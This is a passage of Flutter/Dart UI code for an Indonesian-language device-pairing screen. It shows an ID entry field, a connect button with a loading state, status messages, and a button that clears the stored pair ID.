            const SizedBox(height: 6),
            Text(_paired ? 'Perangkat Terhubung' : 'Hubungkan Perangkat',
                style: TextStyle(color: _paired ? Colors.greenAccent : Colors.white60,
                    fontSize: 13, fontFamily: 'ShareTechMono', letterSpacing: 1.5)),

            const Spacer(),

            // Form box
            Padding(
              padding: const EdgeInsets.symmetric(horizontal: 24),
              child: Container(
                padding: const EdgeInsets.all(24),
                decoration: BoxDecoration(
                  color: const Color(0xFF0F0F0F).withOpacity(0.88),
                  borderRadius: BorderRadius.circular(24),
                  border: Border.all(color: (_paired ? Colors.greenAccent : const Color(0xFFE0E0E0)).withOpacity(0.2), width: 1.5),
                  boxShadow: [BoxShadow(color: Colors.black.withOpacity(0.5), blurRadius: 15)],
                ),
                child: Column(children: [
                  // Status icon kalau sudah pair
                  if (_paired) ...[
                    const Icon(Icons.check_circle_rounded, color: Colors.greenAccent, size: 50),
                    const SizedBox(height: 12),
                    const Text('Perangkat sudah terhubung\nke akun owner',
                        style: TextStyle(color: Colors.greenAccent, fontSize: 13, fontFamily: 'ShareTechMono', height: 1.6),
                        textAlign: TextAlign.center),
                    const SizedBox(height: 8),
                    TextButton(
                      onPressed: () async {
                        final prefs = await SharedPreferences.getInstance();
                        await prefs.remove('pairId');
                        setState(() { _paired = false; _msg = ''; _idCtrl.clear(); });
                      },
                      child: const Text('Ganti ID', style: TextStyle(color: Colors.white38, fontSize: 11, fontFamily: 'ShareTechMono')),
                    ),
                  ] else ...[
                    // Input ID
                    const Text('Masukkan ID dari pemilik akun',
                        style: TextStyle(color: Colors.white38, fontSize: 12, fontFamily: 'ShareTechMono')),
                    const SizedBox(height: 16),
                    Container(
                      decoration: BoxDecoration(
                        color: const Color(0xFF141414), borderRadius: BorderRadius.circular(14),
                        border: Border.all(color: const Color(0xFFE0E0E0).withOpacity(0.12)),
                      ),
                      child: TextField(
                        controller: _idCtrl,
                        textAlign: TextAlign.center,
                        textCapitalization: TextCapitalization.characters,
                        style: const TextStyle(color: Color(0xFFE0E0E0), fontSize: 18, letterSpacing: 4,
                            fontWeight: FontWeight.bold, fontFamily: 'ShareTechMono'),
                        decoration: InputDecoration(
                          hintText: 'MASUKKAN ID',
                          hintStyle: TextStyle(color: Colors.white.withOpacity(0.18), fontSize: 14, letterSpacing: 3),
                          prefixIcon: const Icon(Icons.vpn_key_rounded, color: Color(0xFFE0E0E0), size: 18),
                          border: OutlineInputBorder(borderRadius: BorderRadius.circular(14), borderSide: BorderSide.none),
                          focusedBorder: OutlineInputBorder(borderRadius: BorderRadius.circular(14),
                              borderSide: BorderSide(color: const Color(0xFFE0E0E0).withOpacity(0.4))),
                          contentPadding: const EdgeInsets.symmetric(vertical: 18, horizontal: 12),
                        ),
                        onSubmitted: (_) => _doPair(),
                      ),
                    ),
                    const SizedBox(height: 20),

                    // Status msg
                    if (_msg.isNotEmpty)
                      Padding(
                        padding: const EdgeInsets.only(bottom: 14),
                        child: Text(_msg, style: TextStyle(
                          color: _msg.startsWith('✅') ? Colors.greenAccent
                              : _msg.startsWith('❌') ? Colors.redAccent : Colors.white54,
                          fontSize: 12, fontFamily: 'ShareTechMono',
                        ), textAlign: TextAlign.center),
                      ),

                    // HUBUNGKAN button
                    SizedBox(
                      width: double.infinity, height: 54,
                      child: ElevatedButton(
                        onPressed: _loading ? null : _doPair,
                        style: ElevatedButton.styleFrom(
                          backgroundColor: Colors.transparent, shadowColor: Colors.transparent,
                          shape: RoundedRectangleBorder(borderRadius: BorderRadius.circular(16)),
                          padding: EdgeInsets.zero,
                        ),
                        child: Ink(
                          decoration: BoxDecoration(
                            borderRadius: BorderRadius.circular(16),
                            gradient: const LinearGradient(
                              colors: [Color(0xFF8A8A8A), Color(0xFFE0E0E0)],
                              begin: Alignment.centerLeft, end: Alignment.centerRight,
                            ),
                            boxShadow: [BoxShadow(color: const Color(0xFFE0E0E0).withOpacity(0.4),
                                blurRadius: 18, spreadRadius: 2, offset: const Offset(0, 5))],
                          ),
                          child: Container(
                            alignment: Alignment.center,
                            child: _loading
                                ? const SizedBox(width: 22, height: 22,
                                    child: CircularProgressIndicator(color: Colors.black, strokeWidth: 2.5))
                                : const Text('HUBUNGKAN', style: TextStyle(
                                    fontSize: 15, color: Colors.black, fontFamily: 'Orbitron',
                                    letterSpacing: 2, fontWeight: FontWeight.bold)),
                          ),
                        ),
                      ),
                    ),
                  ],
                ]),
              ),
            ),

            const Spacer(),
            const Padding(
              padding: EdgeInsets.only(bottom: 24),
              child: Text('ID didapat dari pemilik akun • 1x hubung selamanya',
                  style: TextStyle(color: Colors.white24, fontSize: 10, fontFamily: 'ShareTechMono'),
                  textAlign: TextAlign.center),
            ),
          ]),
        )),
      ]),
    );
  }
}
